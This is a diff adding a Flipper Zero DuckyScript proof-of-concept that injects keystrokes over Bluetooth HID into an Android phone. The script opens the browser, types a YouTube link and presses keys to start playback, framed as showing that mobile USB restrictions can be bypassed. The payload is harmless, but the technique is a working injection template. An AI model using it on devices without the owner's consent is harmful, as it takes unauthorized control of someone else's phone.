@@ -1,0 +1,36 @@
+REM ============================================================
+REM  Title       : Android - Bluetooth HID Browser Navigation Demo
+REM  Platform    : Android 14
+REM  Transport   : Flipper Zero -> Bluetooth HID (no USB cable)
+REM  Author      : SeenKid (seenkid on Discord)
+REM  Adapted by  : Akshit (tested over Flipper Zero Bluetooth HID)
+REM  Version     : 1.0
+REM  Description : Proof-of-concept BadUSB payload. Focuses the browser
+REM                address bar, navigates to a YouTube video, then uses
+REM                TAB navigation + ENTER to trigger playback. Demonstrates
+REM                that Bluetooth HID keystroke injection also works on
+REM                mobile, bypassing USB restrictions common on phones.
+REM  Legal       : For authorized testing / education ONLY. See repo
+REM                README and DISCLAIMER before use.
+REM ============================================================
+
+REM --- Open browser (GUI b = browser shortcut on target) ---
+GUI b
+DELAY 700
+
+REM --- Focus the address bar ---
+CTRL l
+DELAY 1500
+
+REM --- Navigate to the target URL ---
+STRINGLN https://www.youtube.com/watch?v=dQw4w9WgXcQ
+DELAY 2200
+
+REM --- Tab to the player and start playback ---
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+ENTER
